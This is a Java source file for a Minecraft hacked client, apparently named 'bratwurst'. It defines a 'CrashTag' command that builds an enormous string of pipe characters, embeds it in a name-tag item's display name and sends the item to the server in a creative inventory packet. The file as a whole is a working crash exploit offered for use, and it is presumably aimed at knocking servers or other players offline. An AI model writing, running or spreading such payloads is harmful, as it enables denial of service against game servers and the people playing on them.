package me.bratwurst.module.Commands;

import io.netty.buffer.Unpooled;
import me.bratwurst.Client;
import me.bratwurst.manager.Command;
import me.bratwurst.utils.PlayerUtil;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.init.Items;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.EnumChatFormatting;

import java.util.Random;

public class CrashTag extends Command {
    public CrashTag() {
        super("CrashTag", "CrashTag", "CrashTag");
    }

    @Override
    public void onCommand(String command, String[] args) {
        String k = "";
        for (int i = 0; i < 1001; i++)
            k = String.valueOf(String.valueOf(k)) + "|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||";
        this.mc.getNetHandler().addToSendQueue((Packet)new C10PacketCreativeInventoryAction(36, Client.createItem(Items.name_tag, "{display:{Name:" + k + ",},}", 1, 0)));
        PlayerUtils.sendMessage("wurde erfolgreich erstellt!");
    }
}